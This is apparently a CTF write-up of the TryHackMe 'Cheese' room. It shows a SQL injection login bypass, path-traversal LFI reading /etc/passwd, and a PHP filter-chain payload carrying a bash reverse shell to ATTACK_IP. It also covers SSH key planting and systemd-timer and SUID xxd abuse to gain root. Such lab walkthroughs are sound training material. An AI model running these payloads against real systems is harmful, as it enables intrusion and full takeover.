---
title: "TryHackMe: Cheese CTF"
author: Neovirex
categories: [TryHackMe]
tags: [web, sqli, sqlmap, php, ld_preload, mysql, Cheese, CTF, web, linux, privilege-escalation]
render_with_liquid: false
media_subpath: /images/tryhackme_cheese/
image:
  path: room_img.png
---
---

**Cheese CTF** is a TryHackMe challenge focused on web application vulnerabilities and Linux privilege escalation, guiding you through **SQL injection**, **LFI**, **SSH key abuse**, and **systemd timer exploitation** from initial enumeration to capturing both user and root flags.



## Initial Enumeration

### RustScan Scan
```bash
rustscan -a 10.10.26.46
```

Key open ports discovered:
- **22** (SSH)  
- **81** (HTTP-alt)

> Many other ports are open but 22 and 81 are of primary interest.  
{: .prompt-tip }

---

## Service Enumeration

### Feroxbuster Directory Busting
```bash
feroxbuster -u http://10.10.26.46/ -w /usr/share/wordlists/dirb/big.txt
```
Found:
- `/login.php` (200)
- `/images/cheese1.jpg`, `/cheese2.jpg`, `/cheese3.jpg` (200)
- `/style.css`, `/login.css` (200)
- Directory listing under `/images/`  

---

## Web Application Analysis

![Login Page](front-page.png) 
![Login Page](thecode.png) 
The `/login.php` page appeared vulnerable to injection and allowed bypass of authentication.

---

## Vulnerability Scanning

### SQL Injection Test
```sql
username: ' || 1=1;-- -
password: anything
```
> Authentication bypass achieved via **SQL injection**.  
{: .prompt-tip }

![img-description](admin.png)

---

## Exploit & Initial Access

### Local File Inclusion (LFI)
```bash
# Attempt to read /etc/passwd
http://10.10.26.46/secret-script.php?file=../../../etc/passwd
```
```text
root:x:0:0:root:/root:/bin/bash
...
comte:x:1000:1000:comte:/home/comte:/bin/bash
```

---

## Privilege Escalation

### Generating Obfuscated PHP Payload
```bash
python3 php_filter_chain_generator.py   --chain '<?php exec("/bin/bash -c '\''bash -i >& /dev/tcp/ATTACK_IP/8084 0>&1'\''"); ?>'   | grep "php" > payload.txt
```

### Deliver Payload & Catch Shell
```bash
tail -n1 payload.txt > clean_payload.txt
curl -o response.txt "http://10.10.26.46/secret-script.php?file=$(cat clean_payload.txt)"
```
```bash
nc -lvnp 8084
# becomes: www-data@cheesectf:/var/www/html$
```

### SSH Key Injection for comte
```bash
# On attacker
cat ~/.ssh/id_ed25519.pub
# On target as www-data
echo "<public_key>" >> /home/comte/.ssh/authorized_keys
```
```bash
ssh -i ~/.ssh/id_ed25519 comte@10.10.177.192
```
`user.txt` captured.

---

## Lateral Movement

### Writable systemd Timer Exploit
```bash
# Edit /etc/systemd/system/exploit.timer
[Timer]
OnBootSec=5s
```
```bash
sudo systemctl daemon-reload
sudo systemctl start exploit.timer
# /opt/xxd created with SUID bit
```

### GTFObins xxd to Add Root Key
```bash
echo 'ssh-ed25519 AAAA... root@attacker'   | xxd | /opt/xxd -r - /root/.ssh/authorized_keys
ssh -i ~/.ssh/id_ed25519 root@10.10.177.192
```

---

## Flags

- **User Flag**: `THM{[REDACTED]}`  
- **Root Flag**: `THM{[REDACTED]}`  

---

<style>
.center img {
  display:block;
  margin-left:auto;
  margin-right:auto;
}
.wrap pre {
  white-space: pre-wrap;
}
</style>